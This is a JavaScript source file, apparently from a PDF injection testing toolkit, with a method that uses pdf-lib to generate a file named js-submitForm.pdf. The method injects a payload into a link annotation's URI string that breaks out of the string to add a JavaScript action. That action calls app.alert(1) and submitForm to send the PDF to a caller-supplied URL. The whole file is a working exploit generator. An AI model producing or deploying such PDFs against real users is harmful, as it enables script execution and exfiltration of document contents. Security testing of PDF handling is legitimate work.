class PDFkit_template{

	test(){
		console.log("test")
	}

	async js_submitForm(out_name='js_submitForm', direction){
		const PDFDocument = require("pdf-lib").PDFDocument, rgb = require("pdf-lib").rgb, PDFString = require("pdf-lib").PDFString, PDFName = require("pdf-lib").PDFName, StandardFonts = require("pdf-lib").StandardFonts
		const pdfDoc = await PDFDocument.create()
		const timesRomanFont = await pdfDoc.embedFont(StandardFonts.TimesRoman)
		const page = pdfDoc.addPage()
		const { width, height } = page.getSize()
		const fontSize = 30
		page.drawText('Test pdf!! ABCDEFG', {
			x:50,
			y: height -4 * fontSize,
			size: fontSize,
			font: timesRomanFont,
			color: rgb(0, 0.53, 0.71)
		})
		const linkAnnotation = pdfDoc.context.obj({
			Type: 'Annot',
			Subtype: 'Link',
			Rect: [50, height - 95, 320, height - 130],
			Border: [0, 0, 2],
			C: [0, 0, 1],
			A: {
				Type: 'Action',
				S: 'URI',
				URI: PDFString.of(`/blah)>>/A<</S/JavaScript/JS(app.alert(1);
				this.submitForm({
				cURL: '`+direction+`',cSubmitAs: 'PDF'}))
				/Type/Action>>/F 0>>(
			`),    }
		})
		const linkAnnotationRef = pdfDoc.context.register(linkAnnotation)
		page.node.set(PDFName.of('Annots'), pdfDoc.context.obj([linkAnnotationRef]))
		const pdfBytes = await pdfDoc.save()
		const fs = require('fs')
		fs.writeFile("js-submitForm.pdf", Buffer.from(pdfBytes), function(err){
			if(err) {
				return [out_name, -1 ];
			}
		});
		return [out_name, 1, direction];
	}
}

module.exports = PDFkit_template